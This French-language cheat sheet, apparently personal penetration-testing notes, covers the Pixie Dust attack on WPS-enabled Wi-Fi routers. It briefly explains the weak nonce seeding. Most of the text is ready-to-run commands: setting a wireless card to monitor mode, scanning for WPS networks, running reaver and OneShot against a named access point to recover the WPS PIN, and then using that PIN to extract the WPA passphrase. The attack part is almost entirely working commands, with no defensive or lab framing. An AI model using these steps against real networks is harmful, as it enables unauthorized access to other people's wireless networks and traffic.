
> [!TIP]
> Consiste à deviner les nonces afin de récupérer le PIN en quelques secondes / heures. Puis récupérer la clé WPA grâce au PIN. Le tout est performé en Offline.
> 
> - `E-S1 = E-S2 = PKe or E-S1 = E-S2 = PKe + N`
> - `Due to the weak random (Unix timestamp) seed, the E-S1, E-S2, and PKe values are often identical, or incrementally different by a small value, N.`
> - `We increment through guesses of the seed values that were used to generate the PKe. This then allows us to guess the E-S1 and E-S2 values, respectively.`
> - `We are then able to retrieve the PSK1 and PSK2 values respectively.`

## 1. Passer en mode monitor

> [!WARNING]
> Important de ne pas utiliser airmon-ng du à un bug avec reaver

```shell-session
sudo iw dev wlan0 interface add mon0 type monitor
```

```shell-session
sudo ifconfig mon0 up
```

```shell-session
iwconfig
```

## 2. Scan WPS networks

Capturer le trafic et afficher les information WPS

```shell-session
sudo airodump-ng --wps --ignore-negative-one mon0
```

## 3. Pixie Dust

Reaver -K 1 ou --pixie-dust

```shell-session
sudo reaver -K 1 -vvv -b 86:FC:9F:5D:67:4E -c 1 -i mon0
```

ou avec OneShot -> https://github.com/fulvius31/OneShot

```shell-session
sudo python3 oneshot.py -b 86:FC:9F:5D:67:4E -i mon0 -K
```

Puis récupérer la clé PSK

```shell-session
sudo reaver -b 86:FC:9F:5D:67:4E -c 1 -p <PIN> -i mon0
```

```shell-session
sudo python3 /opt/OneShot/oneshot.py -b 86:FC:9F:5D:67:4E -i wlan0mon -p <PIN>
```

